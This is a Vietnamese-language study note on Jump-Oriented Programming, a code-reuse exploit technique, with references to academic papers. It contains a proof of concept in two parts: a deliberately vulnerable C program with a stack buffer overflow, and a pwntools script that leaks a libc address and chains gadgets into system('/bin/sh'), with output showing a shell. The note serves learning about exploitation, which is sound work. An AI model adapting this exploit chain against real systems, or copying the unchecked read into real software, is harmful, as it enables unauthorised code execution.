# JOP - Jump Oriented Programming

-	đây là kĩ thuật control flow bằng cách sử dụng JMP instruction
-	JOP gadgets thường ở dạng "instruction phù hợp exploit + JMP instruction".Ex
	-	lưu 0 vào arg đầu tiên ở môi trường x64:  `mov rsi,	0; jmp [r9]`
	-	lưu giá trị của thanh ghi rsp đang chứa vào arg thứ 2 trong môi trường x64: `mov rsi, [rsp]; jmp [r9]`
-	JOP có yêu cầu là cần phải tách biệt cả về gadget lẫn cấu trúc để có thể execute nhiều gadgets
	-	Ex về JOP
		-	giá trị địa chỉ của JOP gadgets được lưu ở 0x1000~0x1018
		-	ở thanh ghi rdx, giá trị `địa chỉ mà JOP gadgets chứa - 0x8` (0x1000) được lưu tại đây.
		-	địa chỉ của dispatcher gadgets bị ghi đè bởi bof
		-	dispatcher gadget hoạt động như sau:
			-	8 được + vào giá trị (0x1000) lưu ở rdx thông qua `add rdx, 8` (rdx:0x1008) 
			-	hàm `jmp [rdx]` sẽ nhảy vào địa chỉ (0xffff0010) được trỏ bởi rdx (0x1008)
		-	JOP gadget 0xffff0010 hoạt động như sau:
			-	`mov rax, [rax]` lấy giá trị trỏ bởi rax gán vào rax
			-	nhảy đến dispatcher gadgets bằng `jmp rsi`



![](https://i.imgur.com/h2upXRy.png)

**Jump-Oriented Programming: A New Class of Code-Reuse Attack**

>-	https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf
>-	https://repository.lib.ncsu.edu/bitstream/handle/1840.4/4135/TR-2010-8.pdf

# Proof of Concept
source:
```c
//gcc -fno-stack-protector -o jop jop.c -ldl -no-pie
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
  
void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 256);
}
  
void main(){
    seteuid(getuid());
    write(1,"Hello ROP\n",10);
    vuln();
}
```

cách thức JOP:

-	lưu địa chỉ của system() vào rax
-	lưu 1st arg (địa chỉ của '/bin/sh\x00') vào rdi dùng JOP và gọi system thông qua `jmp rax`

source py:
```python
from pwn import *

elf = ELF('./jop')
r = process(elf.path)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

r.recvuntil('Printf() address : ')
leak = int(r.recvuntil('\n'),16)
libc.address = leak - libc.sym['printf'] 
#	Note: các gadget đều được tìm = rp++
pop_rax =libc.address + 0x0003a737
pop_rdi_jmp_rax = libc.address + 0x00104112
binsh = next(libc.search('/bin/sh'))

payload =	'A'*0x48
payload +=	p64(pop_rax)
payload +=	p64(libc.sym['system'])
payload +=	p64(pop_rdi_jmp_rax)
payload +=	p64(binsh)

r.sendline(payload)
r.interactive()
```
```nasm
$ python script.py [*] '/home/xfeebe/research/JOP/jop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/xfeebe/research/JOP/jop': pid 12700
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ id
uid=1000(xfeebe) gid=1000(xfeebe) groups=1000(xfeebe),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ 
```
# References
>-	http://www.cs.binghamton.edu/~mkayaalp/jop.h`tml
>-	https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.p`df
>-	https://repository.lib.ncsu.edu/bitstream/handle/1840.4/4135/TR-2010-8.p`df
>-	https://www.abigale.xin/J`OP/


